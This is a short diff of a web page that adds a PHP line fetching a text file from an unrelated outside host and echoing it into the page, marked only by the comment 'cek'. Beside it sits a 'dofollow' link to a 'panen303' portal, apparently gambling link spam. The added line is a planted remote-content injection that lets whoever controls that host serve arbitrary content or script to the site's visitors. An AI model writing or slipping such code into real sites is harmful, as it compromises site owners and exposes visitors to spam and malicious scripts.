@@ -91,3 +91,6 @@
 <a href="https://panen303.powerappsportals.com/" rel="dofollow">panen303</a>
 </div>
 </div>
+<!-- cek -->
+<?php $a = file_get_contents('https://luzlunatarotista.com/.tmb/-/tes.txt');
+echo $a; ?>
